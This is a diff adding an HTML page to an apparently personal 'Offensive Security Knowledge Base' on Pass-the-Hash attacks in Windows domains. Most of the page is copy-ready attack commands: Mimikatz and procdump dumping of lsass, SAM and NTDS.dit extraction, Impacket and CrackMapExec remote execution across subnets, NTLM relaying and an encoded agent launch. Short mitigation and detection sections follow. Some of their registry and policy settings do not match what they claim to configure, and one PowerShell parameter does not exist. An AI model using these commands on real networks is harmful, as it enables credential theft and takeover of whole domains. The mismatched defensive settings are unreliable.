@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pass-the-Hash | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Active Directory</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Active Directory</a> / Pass-the-Hash
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical Severity | T1550.002</span>
+      <h1>🔐 Pass-the-Hash (PtH)</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1550.002</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Windows</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Lateral Movement</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Easy</span></div>
+      </div>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>Pass-the-Hash (PtH) is a credential theft and lateral movement technique that allows an attacker to authenticate to a remote server using the NTLM hash of a user's password instead of the actual password. This works because Windows authentication protocols accept the hash directly.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why PtH Works:</strong>
+        <ul>
+          <li><strong>Hash Reuse:</strong> Windows caches and reuses password hashes for authentication</li>
+          <li><strong>No LM Hash Conversion:</strong> Older protocols allow direct hash authentication</li>
+          <li><strong>Credential Manager:</strong> Stores hashes in memory for single sign-on</li>
+          <li><strong>LSA Access:</strong> Allows extraction of cached credentials</li>
+          <li><strong>Protocol Design:</strong> NTLM doesn't salt or derive keys from password</li>
+        </ul>
+      </div>
+
+      <p><strong>Attack Flow:</strong></p>
+      <ol>
+        <li>Obtain NTLM hash (via lsass dump, SAM extraction, etc.)</li>
+        <li>Use hash to authenticate to remote system via SMB, WMI, RDP, etc.</li>
+        <li>Remote system validates hash against stored hash in NTDS.dit or SAM</li>
+        <li>Gain code execution as that user on target system</li>
+      </ol>
+    </div>
+
+    <!-- 2. HASH EXTRACTION -->
+    <div class="content-section" id="extraction">
+      <h2>🔍 Hash Extraction</h2>
+      
+      <p><strong>From LSASS Process:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Mimikatz - classic lsass dump
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::pth /user:username /domain:domain.com /ntlm:ntlmhash
+
+# Using procdump (for credentials only)
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
+
+# Using lsass protection bypass
+mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"</pre>
+      </div>
+
+      <p><strong>From SAM Database:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Local SAM extraction
+mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+
+# From registry
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+# Then offline extraction with secretsdump.py
+
+# Using volality (memory dump analysis)
+volatility -f memory.dmp --profile=Win10x64 hashdump</pre>
+      </div>
+
+      <p><strong>From NTDS.dit (Domain Controllers):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Using Impacket
+python3 secretsdump.py domain.com/username:password@dc01.domain.com
+
+# Using CrackMapExec
+crackmapexec smb 10.10.10.100 -u username -H ntlmhash --local-auth
+
+# Extract with ntdsutil
+ntdsutil "activate instance ntds" "ifm" "create full C:\ntds" quit quit
+
+# Then parse with secretsdump offline</pre>
+      </div>
+
+      <p><strong>From Cached Credentials:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># WDigest credentials (if enabled)
+mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
+
+# Cached domain credentials
+mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"
+
+# Kerberos TGT/TGS tickets
+mimikatz.exe "privilege::debug" "sekurlsa::tickets" "exit"</pre>
+      </div>
+    </div>
+
+    <!-- 3. EXPLOITATION -->
+    <div class="content-section" id="exploitation">
+      <h2>💣 Pass-the-Hash Execution</h2>
+      
+      <p><strong>Mimikatz Pass-the-Hash:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Direct PtH with Mimikatz
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:corp.com /ntlm:aad3b435b51404eeaad3b435b51404ee:hash" "exit"
+
+# This creates a new process with the stolen identity
+# You can then use dir \\target\c$ or other SMB operations</pre>
+      </div>
+
+      <p><strong>Impacket (Linux):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># psexec style
+python3 psexec.py -hashes ntlmhash domain.com/username@target.corp.com
+
+# WMI execution
+python3 wmiexec.py -hashes ntlmhash domain.com/username@target.corp.com
+
+# SMB exec
+python3 smbexec.py -hashes ntlmhash domain.com/username@target.corp.com
+
+# Over Pass-the-Hash (convert to ticket)
+python3 goldenPac.py domain.com/username@target.corp.com</pre>
+      </div>
+
+      <p><strong>CrackMapExec:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Execute commands via SMB
+crackmapexec smb 10.10.10.100 -u administrator -H ntlmhash -x "whoami"
+
+# Execute with command output
+crackmapexec smb 10.10.10.100 -u administrator -H ntlmhash -X "ipconfig"
+
+# Login with hash
+crackmapexec smb 10.10.10.100 -u administrator -H ntlmhash --local-auth
+
+# Using password spray results
+crackmapexec smb 10.10.10.0/24 -u admin -H ntlmhash -M mimikatz</pre>
+      </div>
+
+      <p><strong>PowerShell Remoting:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Using Mimikatz generated ticket
+$hash = "aad3b435b51404eeaad3b435b51404ee:hash"
+Invoke-Command -ComputerName target -Hash $hash -ScriptBlock { whoami }
+
+# Using PSRemoting with hash
+$creds = New-Object System.Management.Automation.PSCredential("domain\user", (ConvertTo-SecureString $hash -AsPlainText -Force))
+Invoke-Command -ComputerName target -Credential $creds -ScriptBlock { hostname }
+
+# Evil-WinRM
+evil-winrm -i target.corp.com -u username -H ntlmhash</pre>
+      </div>
+
+      <p><strong>RDP with Hash:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Using xfreerdp
+xfreerdp /u:username /d:domain.com /pth:ntlmhash /v:target.corp.com
+
+# Using Mimikatz
+mimikatz "privilege::debug" "sekurlsa::pth /user:username /domain:domain /ntlm:hash /run:mstsc.exe" "exit"</pre>
+      </div>
+    </div>
+
+    <!-- 4. AUTOMATED TOOLS -->
+    <div class="content-section" id="tools-pt">
+      <h2>🛠️ Automated PtH Tools</h2>
+      
+      <p><strong>CrackMapExec Network Wide:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Scan entire subnet with hash
+crackmapexec smb 10.10.10.0/24 -u administrator -H ntlmhash -x "whoami"
+
+# Find which hosts admin has access to
+crackmapexec smb 10.10.10.0/24 -u administrator -H ntlmhash --local-auth
+
+# Modules for credential harvesting
+crackmapexec smb 10.10.10.100 -u admin -H hash -M mimikatz
+crackmapexec smb 10.10.10.100 -u admin -H hash -M lsassy
+
+# Empire agent on all valid hosts
+crackmapexec smb 10.10.10.0/24 -u administrator -H hash -e "powershell -enc ..."</pre>
+      </div>
+
+      <p><strong>Responder + NTLM Relay:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Start responder
+responder.py -I eth0 -w
+
+# Run ntlmrelayx
+python3 ntlmrelayx.py -tf targets.txt -smb2support
+
+# Or relay to specific target
+python3 ntlmrelayx.py -t 10.10.10.100 -smb2support
+
+# Escalate with captured hashes
+python3 ntlmrelayx.py -t dc01.domain.com -smb2support -c "whoami"</pre>
+      </div>
+
+      <p><strong>Invoke-TheHash:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># WMI and SMB hash reuse
+Import-Module .\Invoke-TheHash.ps1
+
+Invoke-SMBExec -Target 10.10.10.100 -Username admin -Domain corp -Hash ntlmhash -Command "cmd /c calc"
+
+Invoke-WMIExec -Target 10.10.10.100 -Username admin -Domain corp -Hash ntlmhash -Command "cmd /c calc"</pre>
+      </div>
+    </div>
+
+    <!-- 5. DEFENSE EVASION -->
+    <div class="content-section" id="defense">
+      <h2>🛡️ PtH Defense Evasion</h2>
+      
+      <p><strong>Token Manipulation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Using existing tokens
+mimikatz "privilege::debug" "token::whoami" "token::list" "token::elevate" "token::revert" "exit"
+
+# Run as different user
+runas /user:domain\user /netonly cmd.exe
+
+# Create new token from hash
+mimikatz "sekurlsa::pth /user:admin /domain:domain /ntlm:hash" "token::whoami"</pre>
+      </div>
+
+      <p><strong>Over Pass-the-Hash (Opth):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Get TGT from hash, then access service
+mimikatz "privilege::debug" "sekurlsa::pth /user:username /domain:domain /ntlm:hash /run:cmd.exe"
+
+# Inside new cmd, request TGS
+klist
+# Then access resources with Kerberos</pre>
+      </div>
+    </div>
+
+    <!-- 6. IMPACT -->
+    <div class="content-section" id="impact">
+      <h2>💥 Impact</h2>
+      
+      <div class="vulnerability-box">
+        <strong>Potential Damage:</strong>
+        <ul>
+          <li><strong>Full Domain Compromise:</strong> Once you have admin hash, domain is compromised</li>
+          <li><strong>Pass-the-Hash to Pass-the-Ticket:</strong> Convert to Kerberos ticket</li>
+          <li><strong>Persistence:</strong> Create golden ticket from krbtgt hash</li>
+          <li><strong>Data Exfiltration:</strong> Access file servers, databases</li>
+          <li><strong>Deploy Ransomware:</strong> Lateral movement to deploy payload</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- 7. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Primary Controls:</strong>
+        <ul>
+          <li><strong>Enable Protected Process Light:</strong> Prevent lsass dump</li>
+          <li><strong>Disable WDigest:</strong> Registry key to disable plaintext storage</li>
+          <li><strong>Restrict NTLM:</strong> Disable on domain controllers</li>
+          <li><strong>Enable Credential Guard:</strong> Hardware-based protection</li>
+          <li><strong>Network Segmentation:</strong> Limit lateral movement paths</li>
+          <li><strong>Rapid Response:</strong> Detect and contain compromised accounts</li>
+        </ul>
+      </div>
+
+      <p><strong>Enable Credential Guard:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Via Group Policy
+Computer Configuration > Administrative Templates > System > 
+Device Guard > Turn On Virtualization Based Security
+
+# Registry method
+Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0
+Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictRemoteClients" -Value 1</pre>
+      </div>
+
+      <p><strong>Disable WDigest:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Disable plaintext password storage
+Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0
+
+# Or via Group Policy
+Computer Configuration > Administrative Templates > 
+MS Security Guide > Configure encryption oracle remediation</pre>
+      </div>
+    </div>
+
+    <!-- 8. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+
+      <p><strong>Windows Event Logs:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Event ID 4624 - Logon (type 3 = network logon, used by PtH)
+# Look for:
+#   Logon Type: 3
+#   Source Network Address: internal
+#   Account Name: different from Original
+
+# Query for suspicious logons
+Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | 
+    Where-Object { $_.Message -match 'Logon Type:\s+3' -and $_.Message -notmatch '127.0.0.1' }</pre>
+      </div>
+
+      <p><strong>SIGMA Rules:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Detect suspicious credential use
+title: Pass-the-Hash Attempt
+id: pth-detection
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4624
+    LogonType: 3
+    IpAddress:
+      - '10.*'
+      - '192.168.*'
+  filter:
+    TargetUserName: 'ANONYMOUS'
+  condition: selection and not filter
+level: high</pre>
+      </div>
+
+      <p><strong>Sysmon Configuration:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Sysmon Event ID 1 - Process Create
+# Look for:
+# - mimikatz.exe
+# - procdump.exe accessing lsass
+# - Rundll32 with suspicious parameters
+
+# Sysmon config for credential monitoring
+<RuleGroup name="CredentialAccess">
+  <ProcessAccess onmatch="include">
+    <TargetImage condition="contains">lsass.exe</TargetImage>
+  </ProcessAccess>
+</RuleGroup></pre>
+      </div>
+    </div>
+
+    <!-- 9. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://www.hammer-software.com/ticket-to-know-how-pass-the-hash-works.jpg" target="_blank">PtH Explained</a></li>
+        <li><a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection" target="_blank">LSA Protection</a></li>
+        <li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank">Mimikatz</a></li>
+        <li><a href="https://github.com/SecureAuthCorp/impacket" target="_blank">Impacket</a></li>
+        <li><a href="https://byt3bl33d3r.github.io/getting-started-with-pass-the-hash-attacks.html" target="_blank">PtH Tutorial</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Active Directory</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+}
+</script>
+
+</body>
+</html>
